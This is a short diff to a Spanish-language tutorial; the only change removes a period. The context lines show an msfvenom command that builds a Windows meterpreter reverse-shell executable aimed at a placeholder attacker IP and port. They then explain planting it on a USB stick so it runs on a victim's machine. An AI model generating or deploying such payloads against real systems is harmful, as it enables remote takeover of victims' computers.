@@ -26,7 +26,7 @@ Luego, en nuestra máquina atacante, crearemos el payload con el siguiente coman
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPAtacante LPORT=PuertoAtacante -f exe -o shell.exe
 ```
-Una vez generado, copiaremos el payload en la USB.
+Una vez generado, copiaremos el payload en la USB
 
 Si deseamos que la USB se ejecute automáticamente en el sistema de la víctima, es necesario que la máquina tenga instalado apo_usb_autorun debido a las restricciones de windows. Si no es así, tendremos que hacer doble clic manualmente en el archivo ejecutable teclas.exe.
 
